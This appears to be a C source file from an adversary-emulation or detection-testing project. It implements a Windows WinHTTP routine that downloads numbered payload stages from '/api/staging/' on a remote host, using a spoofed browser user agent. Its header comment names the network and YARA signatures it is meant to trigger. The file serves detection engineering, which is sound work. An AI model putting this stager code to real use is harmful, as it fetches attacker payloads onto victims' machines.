/*
 * HTTP Fetch Implementation - Windows
 *
 * Uses WinHTTP for HTTP requests.
 *
 * Detection artifact: /api/staging/ URL pattern, WinHTTP API calls
 * Network signature target: stage1_network.yml
 * YARA signature target: stage1_imports.yar (WinHTTP imports)
 */

#ifdef _WIN32

#include "http.h"
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

#define MAX_RESPONSE (10 * 1024 * 1024)  /* 10MB max */

int http_fetch_stage(const char *host, uint16_t port, int stage,
                     uint8_t **out_buf, size_t *out_len)
{
    int result = HTTP_ERR_INIT;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD bytesRead = 0;
    DWORD totalRead = 0;
    DWORD bufSize = 0;
    uint8_t *buffer = NULL;
    wchar_t whost[512];
    wchar_t wpath[64];

    *out_buf = NULL;
    *out_len = 0;

    /* Convert host to wide string */
    if (MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, 512) == 0) {
        return HTTP_ERR_INIT;
    }

    /* Build path */
    swprintf(wpath, 64, L"/api/staging/%d", stage);

    /* Initialize WinHTTP session */
    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) {
        return HTTP_ERR_INIT;
    }

    /* Connect to server */
    hConnect = WinHttpConnect(hSession, whost, port, 0);
    if (!hConnect) {
        result = HTTP_ERR_CONN;
        goto cleanup;
    }

    /* Create request */
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        wpath,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        result = HTTP_ERR_INIT;
        goto cleanup;
    }

    /* Send request */
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        result = HTTP_ERR_SEND;
        goto cleanup;
    }

    /* Receive response */
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        result = HTTP_ERR_RECV;
        goto cleanup;
    }

    /* Check status code */
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (!WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, NULL)) {
        result = HTTP_ERR_RECV;
        goto cleanup;
    }

    if (statusCode != 200) {
        result = HTTP_ERR_RECV;
        goto cleanup;
    }

    /* Allocate initial buffer */
    bufSize = 65536;
    buffer = malloc(bufSize);
    if (!buffer) {
        result = HTTP_ERR_MEM;
        goto cleanup;
    }

    /* Read response body */
    while (1) {
        DWORD available = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &available)) {
            result = HTTP_ERR_RECV;
            goto cleanup;
        }

        if (available == 0) {
            break;  /* Done */
        }

        /* Grow buffer if needed */
        if (totalRead + available > bufSize) {
            bufSize = (totalRead + available) * 2;
            if (bufSize > MAX_RESPONSE) {
                result = HTTP_ERR_MEM;
                goto cleanup;
            }
            uint8_t *newBuf = realloc(buffer, bufSize);
            if (!newBuf) {
                result = HTTP_ERR_MEM;
                goto cleanup;
            }
            buffer = newBuf;
        }

        if (!WinHttpReadData(hRequest, buffer + totalRead, available, &bytesRead)) {
            result = HTTP_ERR_RECV;
            goto cleanup;
        }

        totalRead += bytesRead;
    }

    *out_buf = buffer;
    *out_len = totalRead;
    buffer = NULL;  /* Don't free on cleanup */
    result = HTTP_OK;

cleanup:
    free(buffer);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return result;
}

#endif /* _WIN32 */
